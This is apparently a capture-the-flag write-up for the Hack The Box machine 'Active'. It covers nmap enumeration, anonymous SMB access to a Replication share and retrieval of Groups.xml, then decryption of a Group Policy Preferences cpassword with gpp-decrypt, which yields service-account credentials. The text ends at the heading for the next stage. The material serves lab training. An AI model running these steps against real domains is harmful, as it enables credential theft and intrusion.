# Initial Enumeration

All TCP port scan with Service Version enumeration.
``` bash
nmap -sS -sV -sC -T3 -p- <ip-address>
```

Some of the services found on the machine indicate that it is a Domain Controller, or as such capabilities;

```bash
53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-11-27 10:08:23Z) 135/tcp open msrpc Microsoft Windows RPC 
139/tcp open netbios-ssn Microsoft Windows netbios-ssn 
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 
445/tcp open microsoft-ds? 464/tcp open kpasswd5? 
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
```
 DNS, LDAP and Kerberos services are active on this machine.
 The domain is found in the Service enumeration as "active.htb" so i added it to the etc/hosts file.
`echo "<ip-address> active.htb" | sudo tee -a /etc/hosts`

### SMB Enumeration
 Using **smb-client** I enumerate the shares present on the SMB server:

```zsh:
smbclient -L //<ip-address>
Password for [WORKGROUP\ikosaedr]:
Anonymous login successful
Sharename  Type  Comment
---------  ----  -------
ADMIN$     Disk  Remote Admin
C$         Disk  Default share
IPC$       IPC   Remote IPC
NETLOGON   Disk  Logon server share
Replication Disk
SYSVOL     Disk  Logon server share
Users      Disk
SMB1 disabled -- no workgroup available
```

The only share it is possible to access with anonymous credentials is the “Replication” share, which seems to
be a copy of SYSVOL . This is potentially interesting from a privilege escalation perspective as Group Policies
(and Group Policy Preferences) are stored in the SYSVOL share, which is world-readable to authenticated
users.
We connect to the share and download its contents recursively, noticing the Groups.xml file in particular,
which typically contains username/password combinations that can be useful for exploitation.

```zsh:
smbclient //<ip-address>/Replication
Password for [WORKGROUP\htb-c4rm3l0]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> RECURSE ON
smb: \> PROMPT OFF
smb: \> mget *
<...SNIP...>
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-
00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as
active.htb/Policies/{31B2F340-016D-11D2-945F-
00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (12.4 KiloBytes/sec) (average 15.5
KiloBytes/sec)
<...SNIP...>
```

The *Groups.xml* reads as follows:
```xml:
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-
8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06"
uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName=""
description=""
cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw
/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0"
userName="active.htb\SVC_TGS"/></User>
</Groups>
```

From this file we get an username, apparently for a service account, "*SVC_TGS*" and an encrypted password.

We can decrypt the password with *gpp-decrypt*:
```zsh:
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

GPPstillStandingStrong2k18
```
Now we have an username and a password, that we can use to further enumerate the machine.

## Authenticated Enumeration

